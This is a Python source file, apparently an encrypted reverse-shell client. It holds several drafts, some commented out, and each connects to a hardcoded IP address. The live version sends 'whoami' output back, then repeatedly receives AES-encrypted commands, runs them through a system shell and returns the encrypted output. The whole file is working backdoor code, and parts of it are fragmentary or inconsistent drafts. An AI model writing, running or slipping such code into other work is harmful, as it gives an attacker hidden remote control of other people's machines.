"""
from Crypto.Cipher import AES
import subprocess, socket
import base64
import os

BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"
iv = os.urandom(16)
cipher = AES.new(secret,AES.MODE_CFB, iv)


def connect():
    try:
        global host
        global port
        global s
        global sock
        host = "172.16.69.139"
        port = 1111
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Trying to Connect")
        s.connect((host, port))
        print("Connection Established")
        s.send(os.popen("whoami").read())
    except socket.error as msg:
        print("socket error : " + str(msg[0]))


def receive():
    receive3 = s.recv(1024)
    receive2 = DecodeAES(cipher, receive3)
    print(receive2)
    if receive2 == 'quit' or receive2 == 'exit':
        s.close()
    elif receive2[0:5] == 'shell':
        proc2 = subprocess.Popen(receive2[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc2.stdout.read() + proc2.stderr.read()
        args = output
    else:
        args = "Invalid Command"
    print(args)
    send(args)


def send(args):
    send = s.send(args)
    receive()


connect()
receive()


"""
from Crypto.Cipher import AES
import subprocess, socket
import base64
import os

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# create a cipher object using the random secret
iv = os.urandom(16)
cipher = AES.new(secret, AES.MODE_CFB, iv)
HOST = '172.16.69.139'
PORT = 4442

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Trying to Connect ... !!!")
s.connect((HOST, PORT))
print("Connection EstaBlished")
s.send(os.popen("whoami").read())


while 1:
    # this data is now encrypted
    data = s.recv(1024)

    # decrypt data
    decrypted = DecodeAES(cipher, data)
    print(decrypted)
    # check for quit
    if decrypted == "quit":
        break

    # execute command
    proc = subprocess.Popen(decrypted[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    # save output/error
    stdoutput = proc.stdout.read() + proc.stderr.read()

    # encrypt output
    encrypted = EncodeAES(cipher, stdoutput)

    # send encrypted output
    s.send(encrypted)

# loop ends here
# s.send('Bye now!')
# s.close()

"""
while 1:
    # this data is now encrypted
    data = s.recv(1024)

    # decrypt data
    decrypted = DecodeAES(cipher, data)
    print(decrypted)
    # check for quit
    if decrypted == "quit":
        s.close()

    # execute command
    if decrypted[0:5] == 'shell':
        proc2 = subprocess.Popen(decrypted[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output = proc2.stdout.read() + proc2.stderr.read()
        encrypted = EncodeAES(cipher, output)
        s.send(encrypted)
    else:
        output = "Invalid Command"
        encrypted = EncodeAES(cipher, output)
        s.send(encrypted)
        
    proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)

    # save output/error
    stdoutput = proc.stdout.read() + proc.stderr.read()

    # encrypt output
    """